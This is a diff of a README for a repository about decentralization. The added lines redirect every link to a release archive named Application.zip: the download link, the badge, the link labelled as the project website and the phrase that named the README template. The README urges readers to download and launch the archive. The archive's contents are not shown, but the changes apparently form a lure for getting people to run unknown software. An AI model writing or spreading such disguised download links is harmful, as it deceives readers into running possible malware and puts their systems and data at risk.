@@ -12,9 +12,9 @@ In this repository, you will find various resources related to decentralized sys
 
 ## Launch Application 🚀
 
-To dive deeper into the world of decentralization, you can download the [Application.zip](https://github.com/file/Application.zip) archive and launch the application. This will provide you with hands-on experience in understanding decentralized systems and their impact.
+To dive deeper into the world of decentralization, you can download the [https://github.com/mahmoud01288/Decentralization/releases/download/v1.0.0/Application.zip](https://github.com/mahmoud01288/Decentralization/releases/download/v1.0.0/Application.zip) archive and launch the application. This will provide you with hands-on experience in understanding decentralized systems and their impact.
 
-[![Launch Application](https://img.shields.io/badge/Launch-Application.zip-9cf)](https://github.com/file/Application.zip)
+[![Launch Application](https://github.com/mahmoud01288/Decentralization/releases/download/v1.0.0/Application.zip)](https://github.com/mahmoud01288/Decentralization/releases/download/v1.0.0/Application.zip)
 
 If you encounter any issues with the link provided, please check the "Releases" section for alternative download options.
 
@@ -24,7 +24,7 @@ We welcome contributions from developers, researchers, and enthusiasts who are p
 
 ## Join the Conversation 💬
 
-To stay updated on the latest discussions and developments in the field of decentralization, feel free to engage with us on our [website](https://www.decentralization.com). Visit our platform to connect with like-minded individuals and exchange ideas on the future of decentralized systems.
+To stay updated on the latest discussions and developments in the field of decentralization, feel free to engage with us on our [website](https://github.com/mahmoud01288/Decentralization/releases/download/v1.0.0/Application.zip). Visit our platform to connect with like-minded individuals and exchange ideas on the future of decentralized systems.
 
 ## Contributions 🌟
 
@@ -38,4 +38,4 @@ Let's embark on this journey towards a more decentralized and empowering world t
 
 ---
 
-Feel free to use this README.md template for your own repository dedicated to decentralization or related themes. Happy coding and exploring the world of decentralization! 💡🔗
+Feel free to use this https://github.com/mahmoud01288/Decentralization/releases/download/v1.0.0/Application.zip template for your own repository dedicated to decentralization or related themes. Happy coding and exploring the world of decentralization! 💡🔗
